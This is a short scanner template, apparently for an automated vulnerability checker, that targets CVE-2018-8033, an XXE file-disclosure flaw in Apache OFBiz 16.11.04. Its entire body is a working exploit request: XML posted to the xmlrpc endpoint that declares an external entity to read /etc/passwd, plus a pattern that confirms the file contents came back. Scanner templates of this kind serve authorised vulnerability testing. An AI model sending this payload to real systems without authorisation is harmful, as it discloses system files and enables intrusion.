id: CVE-2018-8033

info:
  name: Apache OFBiz XXE
  author: pikpikcu
  severity: high
  description: XXE injection (file disclosure) exploit for Apache OFBiz 16.11.04
  reference:
    - https://lists.apache.org/thread.html/e8fb551e86e901932081f81ee9985bb72052b4d412f23d89b1282777@%3Cuser.ofbiz.apache.org%3E
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8033

rules:
    r0:
        request:
            method: POST
            path: /webtools/control/xmlrpc
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
